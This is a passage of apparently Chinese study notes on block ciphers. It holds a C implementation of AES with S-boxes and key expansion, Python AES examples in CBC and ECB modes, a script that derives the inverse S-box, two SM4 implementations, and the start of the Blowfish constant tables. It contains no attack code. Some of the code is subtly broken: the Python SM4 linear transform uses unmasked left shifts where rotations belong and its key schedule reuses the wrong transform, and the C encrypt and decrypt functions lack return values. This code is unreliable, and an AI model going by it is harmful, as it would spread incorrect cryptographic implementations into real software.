0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,\t0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,\t0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,\t0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,\t0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,\t0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 &#125;;/** * 逆S盒 */static const int S2[16][16] = &#123; 0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,\t0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,\t0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,\t0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,\t0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,\t0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,\t0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,\t0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,\t0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,\t0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,\t0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,\t0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,\t0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,\t0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,\t0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,\t0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d &#125;;/** * 获取整形数据的低8位的左4个位 */static int getLeft4Bit(int num) &#123;\tint left = num &amp; 0x000000f0;\treturn left &gt;&gt; 4;&#125;/** * 获取整形数据的低8位的右4个位 */static int getRight4Bit(int num) &#123;\treturn num &amp; 0x0000000f;&#125;/** * 根据索引，从S盒中获得元素 */static int getNumFromSBox(int index) &#123;\tint row = getLeft4Bit(index);\tint col = getRight4Bit(index);\treturn S[row][col];&#125;/** * 把一个字符转变成整型 */static int getIntFromChar(char c) &#123;\tint result = (int)c;\treturn result &amp; 0x000000ff;&#125;/** * 把16个字符转变成4X4的数组， * 该矩阵中字节的排列顺序为从上到下， * 从左到右依次排列。 */static void convertToIntArray(char* str, int pa[4][4]) &#123;\tint k = 0;\tfor (int i = 0; i &lt; 4; i++)\t\tfor (int j = 0; j &lt; 4; j++) &#123;\t\t\tpa[j][i] = getIntFromChar(str[k]);\t\t\tk++;\t\t&#125;&#125;/** * 打印4X4的数组 */static void printArray(int a[4][4]) &#123;\tfor (int i = 0; i &lt; 4; i++) &#123;\t\tfor (int j = 0; j &lt; 4; j++)\t\t\tprintf(&quot;a[%d][%d] = 0x%x &quot;, i, j, a[i][j]);\t\tprintf(&quot;\\n&quot;);\t&#125;\tprintf(&quot;\\n&quot;);&#125;/** * 打印字符串的ASSCI， * 以十六进制显示。 */static void printASSCI(char* str, int len) &#123;\tfor (int i = 0; i &lt; len; i++)\t\tprintf(&quot;0x%x &quot;, getIntFromChar(str[i]));\tprintf(&quot;\\n&quot;);&#125;/** * 把连续的4个字符合并成一个4字节的整型 */static int getWordFromStr(char* str) &#123;\tint one = getIntFromChar(str[0]);\tone = one &lt;&lt; 24;\tint two = getIntFromChar(str[1]);\ttwo = two &lt;&lt; 16;\tint three = getIntFromChar(str[2]);\tthree = three &lt;&lt; 8;\tint four = getIntFromChar(str[3]);\treturn one | two | three | four;&#125;/** * 把一个4字节的数的第一、二、三、四个字节取出， * 入进一个4个元素的整型数组里面。 */static void splitIntToArray(int num, int array[4]) &#123;\tint one = num &gt;&gt; 24;\tarray[0] = one &amp; 0x000000ff;\tint two = num &gt;&gt; 16;\tarray[1] = two &amp; 0x000000ff;\tint three = num &gt;&gt; 8;\tarray[2] = three &amp; 0x000000ff;\tarray[3] = num &amp; 0x000000ff;&#125;/** * 将数组中的元素循环左移step位 */static void leftLoop4int(int array[4], int step) &#123;\tint temp[4];\tfor (int i = 0; i &lt; 4; i++)\t\ttemp[i] = array[i];\tint index = step % 4 == 0 ? 0 : step % 4;\tfor (int i = 0; i &lt; 4; i++) &#123;\t\tarray[i] = temp[index];\t\tindex++;\t\tindex = index % 4;\t&#125;&#125;/** * 把数组中的第一、二、三和四元素分别作为 * 4字节整型的第一、二、三和四字节，合并成一个4字节整型 */static int mergeArrayToInt(int array[4]) &#123;\tint one = array[0] &lt;&lt; 24;\tint two = array[1] &lt;&lt; 16;\tint three = array[2] &lt;&lt; 8;\tint four = array[3];\treturn one | two | three | four;&#125;/** * 常量轮值表 */static const int Rcon[10] = &#123; 0x01000000, 0x02000000,\t0x04000000, 0x08000000,\t0x10000000, 0x20000000,\t0x40000000, 0x80000000,\t0x1b000000, 0x36000000 &#125;;/** * 密钥扩展中的T函数 */static int T(int num, int round) &#123;\tint numArray[4];\tsplitIntToArray(num, numArray);\tleftLoop4int(numArray, 1);//字循环\t//字节代换\tfor (int i = 0; i &lt; 4; i++)\t\tnumArray[i] = getNumFromSBox(numArray[i]);\tint result = mergeArrayToInt(numArray);\treturn result ^ Rcon[round];&#125;//密钥对应的扩展数组static int w[44];/** * 扩展密钥，结果是把w[44]中的每个元素初始化 */static void extendKey(char* key) &#123;\tfor (int i = 0; i &lt; 4; i++)\t\tw[i] = getWordFromStr(key + i * 4);\tfor (int i = 4, j = 0; i &lt; 44; i++) &#123;\t\tif (i % 4 == 0) &#123;\t\t\tw[i] = w[i - 4] ^ T(w[i - 1], j);\t\t\tj++;//下一轮\t\t&#125;\t\telse &#123;\t\t\tw[i] = w[i - 4] ^ w[i - 1];\t\t&#125;\t&#125;&#125;/** * 轮密钥加 */static void addRoundKey(int array[4][4], int round) &#123;\tint warray[4];\tfor (int i = 0; i &lt; 4; i++) &#123;\t\tsplitIntToArray(w[round * 4 + i], warray);\t\tfor (int j = 0; j &lt; 4; j++) &#123;\t\t\tarray[j][i] = array[j][i] ^ warray[j];\t\t&#125;\t&#125;&#125;/** * 字节代换 */static void subBytes(int array[4][4]) &#123;\tfor (int i = 0; i &lt; 4; i++)\t\tfor (int j = 0; j &lt; 4; j++)\t\t\tarray[i][j] = getNumFromSBox(array[i][j]);&#125;/** * 行移位 */static void shiftRows(int array[4][4]) &#123;\tint rowTwo[4], rowThree[4], rowFour[4];\t//复制状态矩阵的第2,3,4行\tfor (int i = 0; i &lt; 4; i++) &#123;\t\trowTwo[i] = array[1][i];\t\trowThree[i] = array[2][i];\t\trowFour[i] = array[3][i];\t&#125;\t//循环左移相应的位数\tleftLoop4int(rowTwo, 1);\tleftLoop4int(rowThree, 2);\tleftLoop4int(rowFour, 3);\t//把左移后的行复制回状态矩阵中\tfor (int i = 0; i &lt; 4; i++) &#123;\t\tarray[1][i] = rowTwo[i];\t\tarray[2][i] = rowThree[i];\t\tarray[3][i] = rowFour[i];\t&#125;&#125;/** * 列混合要用到的矩阵 */static const int colM[4][4] = &#123; 2, 3, 1, 1,\t1, 2, 3, 1,\t1, 1, 2, 3,\t3, 1, 1, 2 &#125;;static int GFMul2(int s) &#123;\tint result = s &lt;&lt; 1;\tint a7 = result &amp; 0x00000100;\tif (a7 != 0) &#123;\t\tresult = result &amp; 0x000000ff;\t\tresult = result ^ 0x1b;\t&#125;\treturn result;&#125;static int GFMul3(int s) &#123;\treturn GFMul2(s) ^ s;&#125;static int GFMul4(int s) &#123;\treturn GFMul2(GFMul2(s));&#125;static int GFMul8(int s) &#123;\treturn GFMul2(GFMul4(s));&#125;static int GFMul9(int s) &#123;\treturn GFMul8(s) ^ s;&#125;static int GFMul11(int s) &#123;\treturn GFMul9(s) ^ GFMul2(s);&#125;static int GFMul12(int s) &#123;\treturn GFMul8(s) ^ GFMul4(s);&#125;static int GFMul13(int s) &#123;\treturn GFMul12(s) ^ s;&#125;static int GFMul14(int s) &#123;\treturn GFMul12(s) ^ GFMul2(s);&#125;/** * GF上的二元运算 */static int GFMul(int n, int s) &#123;\tint result;\tif (n == 1)\t\tresult = s;\telse if (n == 2)\t\tresult = GFMul2(s);\telse if (n == 3)\t\tresult = GFMul3(s);\telse if (n == 0x9)\t\tresult = GFMul9(s);\telse if (n == 0xb)//11\t\tresult = GFMul11(s);\telse if (n == 0xd)//13\t\tresult = GFMul13(s);\telse if (n == 0xe)//14\t\tresult = GFMul14(s);\treturn result;&#125;/** * 列混合 */static void mixColumns(int array[4][4]) &#123;\tint tempArray[4][4];\tfor (int i = 0; i &lt; 4; i++)\t\tfor (int j = 0; j &lt; 4; j++)\t\t\ttempArray[i][j] = array[i][j];\tfor (int i = 0; i &lt; 4; i++)\t\tfor (int j = 0; j &lt; 4; j++) &#123;\t\t\tarray[i][j] = GFMul(colM[i][0], tempArray[0][j]) ^ GFMul(colM[i][1], tempArray[1][j])\t\t\t\t^ GFMul(colM[i][2], tempArray[2][j]) ^ GFMul(colM[i][3], tempArray[3][j]);\t\t&#125;&#125;/** * 把4X4数组转回字符串 */static void convertArrayToStr(int array[4][4], char* str) &#123;\tfor (int i = 0; i &lt; 4; i++)\t\tfor (int j = 0; j &lt; 4; j++)\t\t\t*str++ = (char)array[j][i];&#125;/** * 检查密钥长度 */static int checkKeyLen(int len) &#123;\tif (len == 16)\t\treturn 1;\telse\t\treturn 0;&#125;/** * 参数 p: 明文的字符串数组。 * 参数 plen: 明文的长度。 * 参数 key: 密钥的字符串数组。 */int aes(char* p, int plen, char* key) &#123;\tint keylen = strlen(key);\tif (plen == 0 || plen % 16 != 0) &#123;\t\treturn 0;\t&#125;\tif (!checkKeyLen(keylen)) &#123;\t\treturn 0;\t&#125;\textendKey(key);//扩展密钥\tint pArray[4][4];\tfor (int k = 0; k &lt; plen; k += 16) &#123;\t\tconvertToIntArray(p + k, pArray);\t\taddRoundKey(pArray, 0);//一开始的轮密钥加\t\tfor (int i = 1; i &lt; 10; i++) &#123;//前9轮\t\t\tsubBytes(pArray);//字节代换\t\t\tshiftRows(pArray);//行移位\t\t\tmixColumns(pArray);//列混合\t\t\taddRoundKey(pArray, i);\t\t&#125;\t\t//第10轮\t\tsubBytes(pArray);//字节代换\t\tshiftRows(pArray);//行移位\t\taddRoundKey(pArray, 10);\t\tconvertArrayToStr(pArray, p + k);\t&#125;&#125;/** * 根据索引从逆S盒中获取值 */static int getNumFromS1Box(int index) &#123;\tint row = getLeft4Bit(index);\tint col = getRight4Bit(index);\treturn S2[row][col];&#125;/** * 逆字节变换 */static void deSubBytes(int array[4][4]) &#123;\tfor (int i = 0; i &lt; 4; i++)\t\tfor (int j = 0; j &lt; 4; j++)\t\t\tarray[i][j] = getNumFromS1Box(array[i][j]);&#125;/** * 把4个元素的数组循环右移step位 */static void rightLoop4int(int array[4], int step) &#123;\tint temp[4];\tfor (int i = 0; i &lt; 4; i++)\t\ttemp[i] = array[i];\tint index = step % 4 == 0 ? 0 : step % 4;\tindex = 3 - index;\tfor (int i = 3; i &gt;= 0; i--) &#123;\t\tarray[i] = temp[index];\t\tindex--;\t\tindex = index == -1 ? 3 : index;\t&#125;&#125;/** * 逆行移位 */static void deShiftRows(int array[4][4]) &#123;\tint rowTwo[4], rowThree[4], rowFour[4];\tfor (int i = 0; i &lt; 4; i++) &#123;\t\trowTwo[i] = array[1][i];\t\trowThree[i] = array[2][i];\t\trowFour[i] = array[3][i];\t&#125;\trightLoop4int(rowTwo, 1);\trightLoop4int(rowThree, 2);\trightLoop4int(rowFour, 3);\tfor (int i = 0; i &lt; 4; i++) &#123;\t\tarray[1][i] = rowTwo[i];\t\tarray[2][i] = rowThree[i];\t\tarray[3][i] = rowFour[i];\t&#125;&#125;/** * 逆列混合用到的矩阵 */static const int deColM[4][4] = &#123; 0xe, 0xb, 0xd, 0x9,\t0x9, 0xe, 0xb, 0xd,\t0xd, 0x9, 0xe, 0xb,\t0xb, 0xd, 0x9, 0xe &#125;;/** * 逆列混合 */static void deMixColumns(int array[4][4]) &#123;\tint tempArray[4][4];\tfor (int i = 0; i &lt; 4; i++)\t\tfor (int j = 0; j &lt; 4; j++)\t\t\ttempArray[i][j] = array[i][j];\tfor (int i = 0; i &lt; 4; i++)\t\tfor (int j = 0; j &lt; 4; j++) &#123;\t\t\tarray[i][j] = GFMul(deColM[i][0], tempArray[0][j]) ^ GFMul(deColM[i][1], tempArray[1][j])\t\t\t\t^ GFMul(deColM[i][2], tempArray[2][j]) ^ GFMul(deColM[i][3], tempArray[3][j]);\t\t&#125;&#125;/** * 把两个4X4数组进行异或 */static void addRoundTowArray(int aArray[4][4], int bArray[4][4]) &#123;\tfor (int i = 0; i &lt; 4; i++)\t\tfor (int j = 0; j &lt; 4; j++)\t\t\taArray[i][j] = aArray[i][j] ^ bArray[i][j];&#125;/** * 从4个32位的密钥字中获得4X4数组， * 用于进行逆列混合 */static void getArrayFrom4W(int i, int array[4][4]) &#123;\tint index = i * 4;\tint colOne[4], colTwo[4], colThree[4], colFour[4];\tsplitIntToArray(w[index], colOne);\tsplitIntToArray(w[index + 1], colTwo);\tsplitIntToArray(w[index + 2], colThree);\tsplitIntToArray(w[index + 3], colFour);\tfor (int i = 0; i &lt; 4; i++) &#123;\t\tarray[i][0] = colOne[i];\t\tarray[i][1] = colTwo[i];\t\tarray[i][2] = colThree[i];\t\tarray[i][3] = colFour[i];\t&#125;&#125;/** * 参数 c: 密文的字符串数组。 * 参数 clen: 密文的长度。 * 参数 key: 密钥的字符串数组。 */int deAes(char* c, int clen, char* key) &#123;\tint keylen = strlen(key);\tif (clen == 0 || clen % 16 != 0) &#123;\t\treturn 0;\t&#125;\tif (!checkKeyLen(keylen)) &#123;\t\treturn 0;\t&#125;\textendKey(key);//扩展密钥\tint cArray[4][4];\tfor (int k = 0; k &lt; clen; k += 16) &#123;\t\tconvertToIntArray(c + k, cArray);\t\taddRoundKey(cArray, 10);\t\tint wArray[4][4];\t\tfor (int i = 9; i &gt;= 1; i--) &#123;\t\t\tdeSubBytes(cArray);\t\t\tdeShiftRows(cArray);\t\t\tdeMixColumns(cArray);\t\t\tgetArrayFrom4W(i, wArray);\t\t\tdeMixColumns(wArray);\t\t\taddRoundTowArray(cArray, wArray);\t\t&#125;\t\tdeSubBytes(cArray);\t\tdeShiftRows(cArray);\t\taddRoundKey(cArray, 0);\t\tconvertArrayToStr(cArray, c + k);\t&#125;&#125;\n\n\n\nimport base64from Crypto.Cipher import AESpassword = b&#x27;1234567812345678&#x27; #秘钥，b就是表示为bytes类型iv = b&#x27;1234567812345678&#x27; # iv偏移量，bytes类型text = b&#x27;abcdefghijklmnhi&#x27; #需要加密的内容，bytes类型aes = AES.new(password,AES.MODE_CBC,iv) #创建一个aes对象# AES.MODE_CBC 表示模式是CBC模式en_text = aes.encrypt(text)print(&quot;密文：&quot;,en_text) #加密明文，bytes类型m = b&#x27;&#x27;   #要解密的base64代码debase64 = base64.decodebytes(m)aes = AES.new(password,AES.MODE_CBC,iv) #CBC模式下解密需要重新创建一个aes对象den_text = aes.decrypt(debase64)print(&quot;明文：&quot;,den_text)\n\nimport base64from base64 import encodefrom Crypto.Cipher import AESpassword = b&#x27;1234567812345678&#x27; #秘钥，b就是表示为bytes类型text = b&#x27;abcdefghijklmnhi&#x27; #需要加密的内容，bytes类型aes = AES.new(password,AES.MODE_ECB) #创建一个aes对象# AES.MODE_ECB 表示模式是ECB模式m = b&#x27;Pd04a4bt7Bcf97KEfgLGQw==&#x27;   #要解密的base64值en_text = base64.decodebytes(m)# en_text = aes.encrypt(text) #加密明文# print(&quot;密文：&quot;,en_text) #加密明文，bytes类型den_text = aes.decrypt(en_text) # 解密密文print(&quot;明文：&quot;,den_text)# print(den_text.decode(&#x27;gbk&#x27;))   #中文输出\n\n解密AES需要逆s盒，逆s盒脚本为\nnew_s_box = [    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16]import stringnew_contrary_sbox = [0]*256print(len(new_s_box))for i in range(256):    line = (new_s_box[i]&amp;0xf0)&gt;&gt;4    rol = new_s_box[i]&amp;0xf    new_contrary_sbox[(line*16)+rol] = iprint(len(new_contrary_sbox))for i in new_contrary_sbox:    print(f&quot;&#123;hex(i)&#125;,&quot;,end=&#x27;&#x27;)\n\n\n\nSM4SM4 的加密过程将数据块分成 128 位（16 字节）的分组进行加密，使用 32 轮加密操作，基于复杂的置换和替代（P-box 和 S-box）。由于其固定的 128 位分组长度，处理非 128 位整数倍的明文数据时，通常需要进行填充。主要包含异或、移位以及盒变换操作。它分为密钥拓展和加&#x2F;解密两个模块，这两个模块的流程大同小异。其中，移位变换是指循环左移；盒变换是一个将8bit输入映射到8bit输出的变换，是一个固定的变换。\n代码分析（来自Python实现SM4加解密算法_sm4 python-CSDN博客）\n# S盒，用于字节替换S_BOX = [    0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05,    0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,    0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62,    0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6,    0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8,    0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35,    0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87,    0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e,    0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1,    0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3,    0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f,    0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51,    0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8,    0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0,    0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84,    0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48]# 轮常数，用于密钥扩展FK = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc]# 固定参数，用于轮密钥生成CK = [    0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269,    0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9,    0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249,    0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9,    0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229,    0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299,    0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209,    0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279]def byte_sub(byte):    &quot;&quot;&quot;S盒字节替换&quot;&quot;&quot;    return S_BOX[byte]def l_transformation(b):    &quot;&quot;&quot;线性变换&quot;&quot;&quot;    return b ^ (b &lt;&lt; 2) ^ (b &lt;&lt; 10) ^ (b &lt;&lt; 18) ^ (b &lt;&lt; 24)def t_function(x):    &quot;&quot;&quot;T函数，包括S盒替换和线性变换&quot;&quot;&quot;    b = byte_sub((x &gt;&gt; 24) &amp; 0xFF) &lt;&lt; 24 | \\        byte_sub((x &gt;&gt; 16) &amp; 0xFF) &lt;&lt; 16 | \\        byte_sub((x &gt;&gt; 8) &amp; 0xFF) &lt;&lt; 8 | \\        byte_sub(x &amp; 0xFF)    return l_transformation(b)def key_expansion(key):    &quot;&quot;&quot;密钥扩展生成32轮密钥&quot;&quot;&quot;    K = [key[i] ^ FK[i] for i in range(4)]    rk = []    for i in range(32):        temp = K[i] ^ t_function(K[i + 1] ^ K[i + 2] ^ K[i + 3] ^ CK[i])        rk.append(temp)        K.append(temp)    return rkdef sm4_encrypt_block(plaintext, key):    &quot;&quot;&quot;SM4单块加密&quot;&quot;&quot;    rk = key_expansion(key)    X = plaintext.copy()    for i in range(32):        temp = X[i] ^ t_function(X[i + 1] ^ X[i + 2] ^ X[i + 3] ^ rk[i])        X.append(temp)    return X[35:31:-1]  # 反序输出def sm4_decrypt_block(ciphertext, key):    &quot;&quot;&quot;SM4单块解密&quot;&quot;&quot;    rk = key_expansion(key)[::-1]  # 轮密钥反序    X = ciphertext.copy()    for i in range(32):        temp = X[i] ^ t_function(X[i + 1] ^ X[i + 2] ^ X[i + 3] ^ rk[i])        X.append(temp)    return X[35:31:-1]  # 反序输出# 示例使用plaintext = [0x01234567, 0x89abcdef, 0xfedcba98, 0x76543210]key = [0x01234567, 0x89abcdef, 0xfedcba98, 0x76543210]ciphertext = sm4_encrypt_block(plaintext, key)print(f&quot;加密后的密文: &#123;ciphertext&#125;&quot;)decrypted_text = sm4_decrypt_block(ciphertext, key)print(f&quot;解密后的明文: &#123;decrypted_text&#125;&quot;)\n\n常用解密脚本来自sm4 加解密 ( python版本) - 宁青楼 - 博客园\n# -*- coding: utf-8 -*-&quot;&quot;&quot;author: 沈天巡date:2023/4/27-10:33说明：&quot;&quot;&quot;import binasciifrom gmssl import sm4class SM4:    &quot;&quot;&quot;    国产加密 sm4加解密    &quot;&quot;&quot;    def __init__(self):        self.crypt_sm4 = sm4.CryptSM4()  # 实例化    def str_to_hexStr(self , hex_str):        &quot;&quot;&quot;        字符串转hex        :param hex_str: 字符串        :return: hex        &quot;&quot;&quot;        hex_data = hex_str.encode(&#x27;utf-8&#x27;)        str_bin = binascii.unhexlify(hex_data)        return str_bin.decode(&#x27;utf-8&#x27;)    def encryptSM4(self , encrypt_key , value):        &quot;&quot;&quot;        国密sm4加密        :param encrypt_key: sm4加密key        :param value: 待加密的字符串        :return: sm4加密后的十六进制值        &quot;&quot;&quot;        crypt_sm4 = self.crypt_sm4        crypt_sm4.set_key(encrypt_key.encode() , sm4.SM4_ENCRYPT)  # 设置密钥        date_str = str(value)        encrypt_value = crypt_sm4.crypt_ecb(date_str.encode())  # 开始加密。bytes类型        return encrypt_value.hex()  # 返回十六进制值    def decryptSM4(self , decrypt_key , encrypt_value):        &quot;&quot;&quot;        国密sm4解密        :param decrypt_key:sm4加密key        :param encrypt_value: 待解密的十六进制值        :return: 原字符串        &quot;&quot;&quot;        crypt_sm4 = self.crypt_sm4        crypt_sm4.set_key(decrypt_key.encode() , sm4.SM4_DECRYPT)  # 设置密钥        decrypt_value = crypt_sm4.crypt_ecb(bytes.fromhex(encrypt_value))  # 开始解密。十六进制类型        return decrypt_value.decode()        # return self.str_to_hexStr(decrypt_value.hex())if __name__ == &#x27;__main__&#x27;:    key = &quot;love_is_the_soul&quot;    strData = &quot;jntm&quot;    SM4 = SM4()    print(&quot;原字符：&quot; , strData)    encData = SM4.encryptSM4(key , strData)  # 加密后的数据，返回bytes类型    print(&quot;sm4加密结果：&quot; , encData)    # decData = SM4.decryptSM4(key , encData)    # print(&quot;sm4解密结果：&quot; , decData)  # 解密后的数据\n\n\nblowfishBlowFish是一个对称区块加密算法。每次加密数据为 64位 （2个int)类型数据大小。八个字节。密钥采用32-448位。进行多轮加密在加密或者初始化的过程中会使用两个盒来进行加密分别是PBOX 以及SBOX，这两个盒都是预计产生的，可以看成常数。\n大概流程：对盒中PBOX的进行轮询与key进行加密。再用一遍加密函数加密0来改变PBOX和SBOX中的值。最后用明文去查找表数据进行运算替换。\n常量特征\np_box = [    0x243F6A88, 0x85A308D3, 0x13198A2E, 0x03707344,    0xA4093822, 0x299F31D0, 0x082EFA98, 0xEC4E6C89,    0x452821E6, 0x38D01377, 0xBE5466CF, 0x34E90C6C,    0xC0AC29B7, 0xC97C50DD, 0x3F84D5B5, 0xB5470917,    0x9216D5D9, 0x8979FB1B]s_box = [    